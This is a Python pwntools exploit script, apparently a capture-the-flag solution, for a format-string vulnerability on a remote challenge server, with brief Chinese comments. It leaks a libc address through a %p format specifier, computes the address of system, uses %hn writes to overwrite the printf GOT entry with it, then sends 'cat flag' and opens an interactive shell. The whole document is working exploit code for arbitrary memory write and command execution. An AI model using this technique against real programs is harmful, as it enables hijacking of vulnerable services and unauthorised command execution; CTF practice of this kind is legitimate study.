from pwn import *
#context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])
p = remote('yuanshen.life', 35185)
libc = ELF('./libc.so.6')
def run(gadget, target):
    payload = b''
    write_size = 0
    for i in range(3):
        vulen  = (gadget>>(i*16)) & 0xffff
        # 如果已经输入的字符大于了将要输入的值, 那么我们就需要输入对应的负数
        if(vulen > write_size&0xffff):
            payload += b'%' + bytes(str(vulen - (write_size&0xffff)).encode()) + b'c%' + bytes(str(6 + 10 + i).encode()) + b'$hn'
            write_size+=vulen - (write_size&0xffff)
        else:
            payload += b'%' + bytes(str(0x10000 - (write_size&0xffff) + vulen).encode()) + b'c%' + bytes(str(6 + 10 + i).encode()) + b'$hn'
            write_size+=0x10000 - (write_size&0xffff) + vulen
    payload  = payload.ljust(80, b'a')
    payload += p64(target)
    payload += p64(target + 2)
    payload += p64(target + 4)
    return payload

printf_got = 0x404030
system_addr= libc.symbols['system']

# 泄露glibc地址
p.recvuntil('And now let\'s start the game!!!\n')
p.send('%29$paaaa')
libc_base = int(p.recvuntil('aaaa')[:-4], 16) - 0x29D90
system = libc_base + system_addr

# 在printf_got处写入system地址
p.recvuntil('And now let\'s start the game!!!\n')
p.send(run(system, printf_got).ljust(0xc8, b'\x00'))
p.send('cat flag\x00')

p.interactive()
